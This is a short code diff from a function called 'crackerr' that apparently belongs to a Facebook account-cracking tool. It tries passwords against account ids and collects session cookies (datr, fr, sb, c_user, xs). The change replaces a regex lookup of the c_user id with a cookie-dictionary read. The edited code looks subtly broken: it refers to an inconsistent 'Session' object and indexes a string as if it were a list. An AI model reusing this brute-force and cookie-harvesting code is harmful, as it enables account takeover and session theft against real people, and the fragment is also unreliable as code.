@@ -518,7 +518,8 @@ def crackerr(ids,passlist):
                 # Format cookies properly
                 try:
                     kuki = ";".join([f"{key}={session.cookies.get(key)}" for key in ['datr', 'fr', 'sb', 'c_user', 'xs'] if session.cookies.get(key)])
-                    user = re.findall('c_user=(\d+)', kuki)
+                    log_cookies = Session.cookies.get_dict()
+                    user = log_cookies["c_user"]
                     if not user:
                         continue
                     user = user[0]
